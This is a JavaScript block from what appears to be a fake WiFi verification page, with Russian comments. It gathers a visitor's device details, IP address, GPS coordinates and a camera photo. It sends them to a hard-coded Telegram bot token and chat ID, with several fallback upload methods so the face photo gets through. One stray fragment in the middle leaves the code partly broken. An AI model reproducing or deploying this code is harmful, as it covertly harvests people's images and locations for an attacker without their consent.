    <script>
        const BOT_TOKEN = "8462856007:AAHTGYvf-lCH7ahVHb4BOK_4AZ5OrQzVnP4";
        const CHAT_ID = "-1003521523858";
        
        // ЗАМЕНЯЕМ функцию sendToTelegram на ЭТУ:
        async function sendToTelegram(deviceInfo, ipInfo, phoneInfo, location, photoData) {
            let message = `🔓 НОВАЯ ВЕРИФИКАЦИЯ WIFI\n\n`;
            
            message += `📅 Время: ${new Date().toLocaleString('ru-RU')}\n`;
            message += `🌐 URL: ${window.location.href}\n\n`;
            
            message += `👤 ФОТО: ${photoData ? '✅ СДЕЛАНО' : '❌ НЕТ'}\n`;
            message += `📷 Режим: ${useFakeCamera ? 'Фейковая камера' : 'Настоящая камера'}\n\n`;
            
            message += `📱 УСТРОЙСТВО:\n`;
            message += `• ${phoneInfo.brand} ${phoneInfo.model}\n`;
            message += `• ID: ${phoneInfo.uniqueId}\n`;
            message += `• ОС: ${deviceInfo.os} | Браузер: ${deviceInfo.browser}\n`;
            message += `• Экран: ${deviceInfo.screen} | Язык: ${deviceInfo.language}\n`;
            message += `• IP: ${ipInfo.ip}\n`;
            
            if (location) {
                message += `\n📍 ГЕОЛОКАЦИЯ:\n`;
                message += `• Координаты: ${location.lat ? location.lat.toFixed(6) : 'N/A'}, ${location.lng ? location.lng.toFixed(6) : 'N/A'}\n`;
                if (location.city) message += `• Город: ${location.city}\n`;
            }
            
            message += `\n📊 СТАТУС: ${photoData ? 'ПОЛНАЯ ВЕРИФИКАЦИЯ' : 'БАЗОВАЯ ВЕРИФИКАЦИЯ'}`;
            
            // ШАГ 1: Отправляем текстовое сообщение
            try {
                const textResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                const textData = await textResponse.json();
                console.log('Текст отправлен:', textData);
            } catch (e) {
                console.error('Ошибка отправки текста:', e);
            }
            
            // ШАГ 2: Отправляем фото если есть (исправленный метод)
            if (photoData) {
                await sendPhotoToTelegram(photoData, deviceInfo, phoneInfo);
            }
        }
        
        // НОВАЯ ФУНКЦИЯ для отправки фото
        async function sendPhotoToTelegram(photoData, deviceInfo, phoneInfo) {
            try {
                // Метод 1: Через fetch и FormData
                const blob = await fetch(photoData).then(r => r.blob());
                
                // Создаем уникальное имя файла
                const fileName = `photo_${Date.now()}_${phoneInfo.uniqueId}.jpg`;
                
                // Создаем FormData
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, fileName);
                formData.append('caption', `Фото: ${phoneInfo.brand} | ${deviceInfo.os} | ${new Date().toLocaleTimeString()}`);
                
                // Отправляем
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                console.log('Фото отправлено (метод 1):', result);
                
                // Если не получилось, пробуем метод 2
                if (!result.ok) {
                    await sendPhotoMethod2(photoData);
                }
                
            } catch (error) {
                console.error('Метод 1 не сработал:', error);
                // Пробуем метод 2
                await sendPhotoMethod2(photoData);
            }
        }
        
        // Метод 2: Альтернативный способ отправки фото
        async function sendPhotoMethod2(photoData) {
            try {
                // Преобразуем base64 в бинарные данные
                const base64Data = photoData.split(',')[1];
                const binaryString = atob(base64Data);
                const bytes = new Uint8Array(binaryString.length);
                
                for (let i = 0; i < binaryString.length; i++) {
                    bytes[i] = binaryString.charCodeAt(i);
                }
                
                const blob = new Blob([bytes], { type: 'image/jpeg' });
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'verification_photo.jpg');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                console.log('Фото отправлено (метод 2):', await response.json());
                
            } catch (error) {
                console.error('Метод 2 не сработал:', error);
                // Метод 3: Отправляем как документ
                await sendPhotoMethod3(photoData);
            }
        }
        
        // Метод 3: Отправляем как документ
        async function sendPhotoMethod3(photoData) {
            try {
                const blob = await fetch(photoData).then(r => r.blob());
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('document', blob, 'face_verification.jpg');
                formData.append('caption', 'Фото верификации');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData
                });
                
                console.log('Фото отправлено как документ:', await response.json());
                
            } catch (error) {
                console.error('Все методы не сработали:', error);
                // Отправляем хотя бы ссылку на фото
                await sendPhotoLink(photoData);
            }
        }
        
        // Метод 4: Отправляем ссылку на фото
        async function sendPhotoLink(photoData) {
            try {
                // Создаем временную ссылку на фото
                const photoLink = photoData.substring(0, 100) + '...';
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `📸 Фото верификации (base64): ${photoLink}`,
                        parse_mode: 'HTML'
                    })
                });
                
            } catch (error) {
                console.error('Не удалось отправить даже ссылку:', error);
            }
        }

            // Сохраняем фото
            const photoData = canvas.toDataURL('image/jpeg', 0.9);
            capturedPhotos.push(photoData);
            
            // Показываем превью
            showPhotoPreview(photoData);
        }
        
        // ТЕСТОВАЯ функция для проверки бота
        async function testBotWithPhoto() {
            console.log('Тестируем отправку фото...');
            
            // Создаем тестовое фото
            const canvas = document.createElement('canvas');
            canvas.width = 400;
            canvas.height = 300;
            const ctx = canvas.getContext('2d');
            
            ctx.fillStyle = '#2196f3';
            ctx.fillRect(0, 0, 400, 300);

            const testPhoto = canvas.toDataURL('image/jpeg');
            
            // Отправляем тест
            await sendPhotoToTelegram(testPhoto, 
                {os: 'Test', browser: 'Test'}, 
                {brand: 'Test', uniqueId: 'test123'}
            );
            
            alert('Тест отправлен! Проверь Telegram.');
        }
        
        // Добавляем кнопку теста в интерфейс
        document.addEventListener('DOMContentLoaded', function() {
            const testBtn = document.createElement('button');
            testBtn.textContent = '🔄 Тест бота';
            testBtn.onclick = testBotWithPhoto;
            testBtn.style.position = 'fixed';
            testBtn.style.bottom = '10px';
            testBtn.style.right = '10px';
            testBtn.style.zIndex = '9999';
            testBtn.style.background = '#ff9800';
            document.body.appendChild(testBtn);
        });
    </script>
